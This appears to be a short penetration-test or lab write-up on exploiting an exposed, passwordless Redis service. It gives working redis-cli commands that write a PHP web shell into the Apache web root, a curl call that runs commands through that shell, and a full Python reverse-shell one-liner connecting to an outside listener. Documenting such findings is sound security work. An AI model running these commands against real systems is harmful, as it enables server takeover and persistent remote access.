1. Vulnerability Overview
Name/Type: Unauthenticated Redis Arbitrary File Write leading to Remote Code Execution (RCE).
CVE: N/A (Misconfiguration of standard features, similar to generic Redis RCE techniques).
Severity: Critical. An attacker can gain full control of the web server by writing malicious code (web shells) to the web root directory.
Attack Vector: The Redis service (Port 6379) is exposed to the external network (0.0.0.0), has "Protected Mode" disabled, and requires no password authentication. An attacker can connect directly and use the CONFIG SET command to write files to the server's disk.
Step 1: Reconnaissance
The attacker begins by scanning the target to identify open ports. We are looking for Port 6379 (Redis) and Port 80 (Web).
```
nmap -p 80,6379 100.65.3.183
```
Refer to screenshot nmap-scan.png

2. Exploitation
Once connected to Redis we exploit the ability to change the database working directory to the database filename. We ponit these to the apache web root and create a PHP file containing a malicious payload.

```
redis-cli -h 100.65.3.183 config set dir /var/www/html
redis-cli -h 100.65.3.183 config set dbfilename hack.php
redis-cli -h 100.65.3.183 set payload "<?php system(\$_GET['cmd']); ?>"
redis-cli -h 100.65.3.183 save
curl -s "http://100.65.3.183/hack.php?cmd=id" | grep -a "uid="
```
Refer to screenshot exploit-step2.png

Post exploitation:
Executed a Python3 reverse shell payload via the web shell to bypass the limited HTTP interface and establish persistence.
```
curl -G "http://100.65.3.183/hack.php" --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"100.65.7.178\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```
Refer to screenshot reverse-shell.png
